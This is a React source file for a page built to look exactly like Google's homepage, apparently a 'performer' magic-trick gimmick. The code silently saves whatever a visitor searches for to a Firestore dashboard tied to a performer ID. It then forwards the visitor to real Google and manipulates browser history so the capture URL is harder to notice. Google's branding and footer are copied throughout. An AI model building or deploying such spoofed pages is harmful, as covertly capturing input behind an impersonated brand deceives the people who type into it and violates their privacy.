
import React, { useState, useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { firestoreService } from '../services/firestoreService';
import { GOOGLE_SEARCH_URL } from '../constants';

const NEWS_ARTICLES = [
  {
    id: 1,
    title: "SpaceX successfully launches latest Starlink mission from Florida",
    source: "Space.com",
    time: "2h ago",
    image: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=200&h=120&q=80"
  },
  {
    id: 2,
    title: "New study reveals surprising benefits of morning sunlight exposure",
    source: "HealthLine",
    time: "4h ago",
    image: "https://images.unsplash.com/photo-1470252649378-9c29740c9fa8?auto=format&fit=crop&w=200&h=120&q=80"
  },
  {
    id: 3,
    title: "Global tech summit announces focus on sustainable AI development",
    source: "TechCrunch",
    time: "5h ago",
    image: "https://images.unsplash.com/photo-1485827404703-89b55fcc595e?auto=format&fit=crop&w=200&h=120&q=80"
  }
];

const SearchPage: React.FC = () => {
  const { performerId } = useParams<{ performerId: string }>();
  const [query, setQuery] = useState('');
  const [isFocused, setIsFocused] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    inputRef.current?.focus();
    // Browser history manipulation to hide the /search/id from immediate glance
    if (window.history.pushState) {
        window.history.pushState(null, "", window.location.href);
    }
  }, []);

  const handleSearch = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const trimmedQuery = query.trim();
    if (!trimmedQuery) return;

    // Silent capture to performer dashboard
    if (performerId) {
      try {
        await firestoreService.submitSearch(performerId, trimmedQuery);
      } catch (error) {
        console.error('Error submitting search:', error);
        // Continue with redirect even if Firestore write fails
      }
    }

    // Set redirect state to prevent interaction and provide feedback
    setIsRedirecting(true);

    // Immediate redirect to real Google search with parameters
    // We use window.top.location.href to break out of iframes if necessary
    try {
      window.top!.location.href = `${GOOGLE_SEARCH_URL}${encodeURIComponent(trimmedQuery)}`;
    } catch (err) {
      // Fallback if top-level navigation is restricted
      window.location.href = `${GOOGLE_SEARCH_URL}${encodeURIComponent(trimmedQuery)}`;
    }
  };

  if (isRedirecting) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center font-sans">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#4285F4]"></div>
      </div>
    );
  }
  

  return (
    <div className="min-h-screen bg-white flex flex-col items-center select-none font-sans overflow-x-hidden">
      {/* Google Top Header */}
      <div className="w-full h-[60px] flex justify-end items-center gap-4 text-[13px] text-[#000000df] pr-6">
        <span className="hover:underline cursor-pointer">Gmail</span>
        <span className="hover:underline cursor-pointer">Images</span>
        <div className="p-2 hover:bg-gray-100 rounded-full cursor-pointer transition-colors">
          <svg className="w-[18px] h-[18px] text-[#5f6368]" fill="currentColor" viewBox="0 0 24 24">
            <path d="M6,8c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,8,6,8z M12,20c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S10.9,20,12,20z M6,20 c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,20,6,20z M6,14c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S4.9,14,6,14z M12,14c1.1,0,2-0.9,2-2 s-0.9-2-2-2s-2,0.9-2,2S10.9,14,12,14z M18,14c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S16.9,14,18,14z M18,8c1.1,0,2-0.9,2-2 s-0.9-2-2-2s-2,0.9-2,2S16.9,8,18,8z M12,8c1.1,0,2-0.9,2-2s-0.9-2-2-2s-2,0.9-2,2S10.9,8,12,8z M18,20c1.1,0,2-0.9,2-2s-0.9-2-2-2 s-2,0.9-2,2S16.9,20,18,20z"></path>
          </svg>
        </div>
        <button className="bg-[#1a73e8] text-white px-6 py-[9px] rounded-[4px] font-medium hover:shadow-md transition-shadow text-sm leading-none">
          Sign in
        </button>
      </div>

      {/* Center Search Area */}
      <div className="flex-1 flex flex-col items-center pt-6 md:pt-20 w-full max-w-xl px-4">
        {/* Google Logo */}
        <div className="mb-7 mt-5 select-none pointer-events-none">
          <div className="text-[72px] md:text-[92px] font-medium tracking-tight google-font flex leading-none">
             <span className="text-[#4285F4]">G</span>
             <span className="text-[#EA4335]">o</span>
             <span className="text-[#FBBC05]">o</span>
             <span className="text-[#4285F4]">g</span>
             <span className="text-[#34A853]">l</span>
             <span className="text-[#EA4335]">e</span>
          </div>
        </div>

        {/* Search Bar Container */}
        <form onSubmit={handleSearch} className="w-full max-w-[584px] relative mb-12">
          <div 
            className={`flex items-center w-full min-h-[44px] px-[14px] rounded-full border border-[#dfe1e5] transition-all bg-white
            ${isFocused ? 'shadow-[0_1px_6px_rgba(32,33,36,0.28)] border-transparent' : 'hover:shadow-[0_1px_6px_rgba(32,33,36,0.28)] hover:border-transparent'}`}
          >
            <div className="pr-[13px] flex items-center justify-center">
              <svg className="w-5 h-5 text-[#9aa0a6]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
              </svg>
            </div>
            <input 
              ref={inputRef}
              type="text" 
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              onFocus={() => setIsFocused(true)}
              onBlur={() => setIsFocused(false)}
              className="flex-1 focus:outline-none text-[16px] text-[#202124] h-full py-[11px] bg-transparent"
              autoComplete="off"
              autoCorrect="off"
              spellCheck="false"
            />
            <div className="flex items-center pl-[13px] gap-4">
              <svg 
                className="w-6 h-6 cursor-pointer text-[#4285F4]" 
                fill="currentColor" 
                viewBox="0 0 24 24"
                aria-label="Voice Search"
              >
                <path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/>
              </svg>
              <svg 
                className="w-6 h-6 cursor-pointer text-[#4285F4]" 
                fill="currentColor" 
                viewBox="0 0 24 24"
                aria-label="Search by image"
              >
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.72-2.92 0-1.21-.49-2.19-3.61-2.85z"/>
              </svg>
            </div>
          </div>

          {/* Buttons Area */}
          <div className="mt-[29px] flex justify-center gap-3">
            <button 
              type="submit"
              className="px-4 py-2 bg-[#f8f9fa] hover:bg-[#f1f3f4] border border-[#f8f9fa] hover:border-[#dadce0] hover:shadow-[0_1px_1px_rgba(0,0,0,0.1)] rounded-[4px] text-sm text-[#3c4043] transition-all min-w-[126px]"
            >
              Google Search
            </button>
            <button 
              type="button"
              className="px-4 py-2 bg-[#f8f9fa] hover:bg-[#f1f3f4] border border-[#f8f9fa] hover:border-[#dadce0] hover:shadow-[0_1px_1px_rgba(0,0,0,0.1)] rounded-[4px] text-sm text-[#3c4043] transition-all min-w-[126px]"
            >
              I'm Feeling Lucky
            </button>
          </div>
        </form>

        {/* Discover / News Recommendations Feed */}
        <div className="w-full max-w-[584px] border-t border-gray-100 pt-8">
          <div className="flex items-center justify-between mb-4">
             <div className="flex items-center gap-2">
                <svg className="w-5 h-5 text-[#4285F4]" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
                <span className="text-sm font-medium text-gray-900">Discover</span>
             </div>
             <svg className="w-5 h-5 text-gray-400 cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
          </div>

          <div className="space-y-4 mb-12">
            {NEWS_ARTICLES.map((article) => (
              <div key={article.id} className="group cursor-pointer flex gap-4 p-4 hover:bg-gray-50 rounded-2xl transition-colors border border-gray-100">
                <div className="flex-1">
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-xs font-medium text-gray-500">{article.source}</span>
                    <span className="text-gray-300">•</span>
                    <span className="text-xs text-gray-400">{article.time}</span>
                  </div>
                  <h3 className="text-base font-medium text-gray-900 leading-tight group-hover:text-blue-600 transition-colors">
                    {article.title}
                  </h3>
                </div>
                <div className="w-[100px] h-[70px] rounded-xl overflow-hidden flex-shrink-0">
                  <img src={article.image} alt="" className="w-full h-full object-cover" />
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="mt-2 mb-8 text-[13px] text-[#4d5156] text-center">
          Google offered in: 
          <span className="text-[#1a0dab] hover:underline cursor-pointer ml-2">हिन्दी</span> 
          <span className="text-[#1a0dab] hover:underline cursor-pointer ml-2">বাংলা</span> 
          <span className="text-[#1a0dab] hover:underline cursor-pointer ml-2">తెలుగు</span>
        </div>
      </div>

      {/* Footer Area */}
      <footer className="w-full bg-[#f2f2f2] text-[14px] text-[#70757a] mt-auto">
        <div className="px-7 py-[15px] border-b border-[#dadce0]">
          United Kingdom
        </div>
        <div className="px-7 py-[15px] flex flex-wrap justify-center sm:justify-between gap-x-7 gap-y-3 max-w-[1600px] mx-auto">
          <div className="flex gap-x-7">
            <span className="hover:underline cursor-pointer">About</span>
            <span className="hover:underline cursor-pointer">Advertising</span>
            <span className="hover:underline cursor-pointer">Business</span>
            <span className="hover:underline cursor-pointer">How Search works</span>
          </div>
          <div className="flex gap-x-7">
            <span className="hover:underline cursor-pointer">Privacy</span>
            <span className="hover:underline cursor-pointer">Terms</span>
            <span className="hover:underline cursor-pointer">Settings</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default SearchPage;
